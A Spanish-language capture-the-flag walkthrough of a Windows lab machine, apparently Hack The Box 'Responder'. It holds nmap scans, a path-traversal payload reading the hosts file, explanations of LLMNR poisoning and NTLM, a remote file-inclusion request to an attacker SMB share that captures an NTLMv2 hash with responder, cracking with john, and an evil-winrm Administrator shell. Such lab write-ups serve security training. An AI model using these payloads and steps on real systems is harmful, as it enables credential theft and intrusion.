🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.22.57

PING 10.129.22.57 (10.129.22.57) 56(84) bytes of data.
64 bytes from 10.129.22.57: icmp_seq=1 ttl=127 time=165 ms

--- 10.129.22.57 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 165.094/165.094/165.094/0.000 ms
```

> Sistema operativo:  **Windows**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.22.57 -oG openPorts

PORT     STATE SERVICE   REASON
80/tcp   open  http      syn-ack ttl 127
7680/tcp open  pando-pub syn-ack ttl 127
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 80,7680 -sCV 10.129.22.57 -oN targeted

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
7680/tcp open  pando-pub?
```

| Puerto | Servicio  | Versión                                                 |
| ------ | --------- | ------------------------------------------------------- |
| 80     | http      | Apache httpd 2.4.52 ((Win64)) OpenSSL/1.1.1m PHP/8.1.1) |
| 7680   | pando-pub | ?                                                       |

🗹 Cambiar el idioma de la web y comprobar que el servidor es vulnerable a un **path traversal** comprobando si podemos leer, por ejemplo, el archivo `C:\Windows\System32\drivers\etc\hosts` agregando al parámetro `page` el path  `../../windows/system32/drivers/etc/hosts`, quedando la solicitud`http://unika.htb/index.php?page=../../windows/system32/drivers/etc/hosts`.

```
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
```

> [! INFO]
> Cuando un cliente Windows no puede resolver un nombre de un host utilizando el servicio DNS, este utilizará el protocolo de resolución de nombres de multidifusión o mejor llamado **LLMNR** (Link-Local Multicast Name Resolution) para pedir a los equipos en la red local resolver las direcciones IPv4 e inclusive bajo IPv6.
> Si la solicitud usando **LLMNR** falla, se utilizará el protocolo **NETBIOS** (Network Basic Input/Output System) o **NBT-NS** el cual cumple el mismo objetivo que el anterior. 
> Entonces, cuando un host utiliza **LLMNR** o **NBT-NS** para resolver una solicitud de un recurso de red, es posible que cualquier host de la red que conozca la dirección IP del host al que se le pregunte puede responder. Incluso si un host responde a una de estas solicitudes con información incorrecta, todavía se considerará como legítimo.

> [! INFO]
> NTLM es una colección de protocolos de autenticación creada por Microsoft. NT LAN Manager permite a varias computadores y servidores llevar a cabo autenticación. La mayoría de las redes intentan denegar el acceso a usuarios no autorizados, el que requiere la implementación de un proceso de autenticación.
> El protocolo requiere a un cliente autenticarse proveyendo un nombre usuario y su correspondiente contraseña. Esto permite Esto permite establecer un intercambio entre el dispositivo del usuario y un servidor. Después de que las credenciales hayan sido reconocidas, el servidor puede chequear los permisos de acceso y permite la entrada al usuario.
How does NTLM authentication work?
> NTLM usa un protocolo **challenge-response** para chequear la autenticidad de un usuario en la red. Para hacer eso, el cliente y el host realizan los siguientes pasos:
> 1. El cliente envía un nombre de usuario al host.
> 1. El host responde con un número aleatorio (el **challenge**).
> 2. El cliente entonces genera un valor de contraseña hasheado a partir del número y la contraseña del usuario, y entonces lo envía de vuelta como **response**.
> 3. El hosy conoce la contraseña del usuario y genera una valor de contraseña hasheado el que compara al **response** del cliente.
>4. Si ambos valores coinciden, al autenticación del cliente se confirma, y se garantiza el acceso a la red. Si no hay coincidencia entre los valores, se le niega el acceso al cliente.

🗹 Utilizar la herramienta `responder` para capturar credenciales:

```shell
sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.193]
    Responder IPv6             [dead:beef:2::10bf]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-KGSB0MULYU2]
    Responder Domain Name      [LMVG.LOCAL]
    Responder DCE-RPC Port     [47631]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.77.76
[SMB] NTLMv2-SSP Username : RESPONDER\<SNIP>
[SMB] NTLMv2-SSP Hash     : <SNIP>
```

🗹 Enviar la solicitud  a la web desde el parámetro `page`, `http://unika.htb/index.php?page=//10.10.14.193/pwned`.

🗹 Guardar el hash obtenido con `responder`:

```shell
echo 'Administrator::RESPONDER:<SNIP>' >> hash.txt
```

🗹 Crackear el hash con `john`:

```shell
john -w=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<SNIP>        (Administrator)     
1g 0:00:00:00 DONE (2024-03-08 23:11) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

🗹 

```shell
evil-winrm -i 10.129.152.190 -u <user> -p <password>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
## Flag

La flag se encuentra en el directorio `C:\Users\mike\Desktop\flag.txt`.